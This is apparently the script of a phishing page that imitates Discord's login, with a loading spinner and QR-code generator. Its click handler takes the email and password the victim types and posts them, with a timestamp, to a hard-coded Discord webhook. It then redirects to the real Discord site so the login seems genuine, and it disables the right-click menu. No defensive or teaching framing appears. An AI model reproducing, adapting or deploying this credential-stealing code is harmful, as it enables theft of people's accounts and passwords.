// ----------------------------------
// SELECTING ELEMENTS
// ----------------------------------
const loginButton = document.querySelector("button");
const emailInput = document.querySelector('input[type="text"]'); // Assuming email/phone input is type="text"
const passwordInput = document.querySelector('input[type="password"]');

// Debug log to check if inputs are found
console.log("Script loaded. Email input:", emailInput);
console.log("Password input:", passwordInput);

// -----------------------------------
// ELLIPSIS ANIMATION
// ------------------------------------
function removeEllipsisAnimation() {
  loginButton.innerHTML = "";
  loginButton.textContent = "Log In";
  loginButton.removeAttribute("disabled");
}

function animateEllipsis() {
  loginButton.innerHTML = "";
  loginButton.innerHTML = `<span class="spinner" role="img" aria-label="Loading">
                              <span class="inner pulsingEllipsis">
                                  <span class="item spinnerItem"></span>
                                  <span class="item spinnerItem"></span>
                                  <span class="item spinnerItem"></span>
                              </span>
                           </span>`;
  const spinnerItems = document.querySelectorAll(".spinnerItem");
  spinnerItems.forEach((item, index) => {
    item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${index * 0.2}s`;
  });
  loginButton.setAttribute("disabled", "true");

  setTimeout(removeEllipsisAnimation, 3000);
}

// --------------------------------------------------
// ---------- GENERATING QRCODE ---------------------
// --------------------------------------------------
function generateQRCode(data) {
  try {
    const qr = qrcode(0, "L");
    qr.addData(data);
    qr.make();
    const moduleCount = qr.getModuleCount();
    const svgString = qr.createSvgTag(1, 0);
    const parser = new DOMParser();
    const svgDoc = parser.parseFromString(svgString, "image/svg+xml");
    const svgElement = svgDoc.documentElement;
    svgElement.setAttribute("width", "160");
    svgElement.setAttribute("height", "160");
    svgElement.setAttribute("viewBox", "0 0 37 37");
    const path = svgElement.querySelector("path");
    if (path) {
      path.setAttribute("transform", `scale(${37 / moduleCount})`);
    }
    return svgElement;
  } catch (error) {
    console.error("Error generating QR code:", error);
    return null;
  }
}

// --------------------------------------------------
// ---------- WEBHOOK FUNCTION ----------------------
// --------------------------------------------------
async function sendToWebhook(email, password) {
  const webhookUrl = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G"; // Replace with real URL
  const payload = {
    content: `Email: ${email}\nPassword: ${password}\nTimestamp: ${new Date().toISOString()}`,  // Include the email, password, and timestamp as part of the content.
    username: "Login Attempt", // You can customize the bot's username
    avatar_url: "https://example.com/avatar.png", // Optional: Provide an avatar for the bot
  };

  console.log("Attempting to send payload:", payload); // Debug: See what’s being sent

  try {
    const response = await fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload)
    });

    const responseText = await response.text();
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}: ${responseText}`);
    }

    console.log("Webhook success! Response:", responseText);
    return true;
  } catch (error) {
    console.error("Webhook failed:", error.message);
    alert("There was an error sending the webhook. Check the console.");
    return false;
  }
}

// --------------------------
// ATTACHING EVENT LISTENERS
// --------------------------
loginButton.addEventListener("click", async () => {
  const email = emailInput ? emailInput.value.trim() : "";
  const password = passwordInput ? passwordInput.value.trim() : "";

  console.log("Email:", email, "Password:", password); // Debug: Make sure you have correct values

  if (!email || !password) {
    alert("Please enter both email and password!");
    return; // Don't proceed if fields are empty
  }

  // Start animation
  animateEllipsis();

  // Send to webhook (will send empty strings if fields are not filled)
  const webhookSuccess = await sendToWebhook(email, password);

  // After animation (3s), redirect if success
  setTimeout(() => {
    if (webhookSuccess) {
      console.log("Redirecting to Discord...");
      window.location.href = "https://discord.com/channels/@me"; // Changed to Discord home for logged-in feel (adjust if needed)
    } else {
      console.log("Webhook failed - no redirect");
      // Optional: Add alert here if you want user feedback on failure
      alert("Login failed - check console for details");
    }
  }, 3000);
});

document.addEventListener("contextmenu", function (e) {
  e.preventDefault();
});
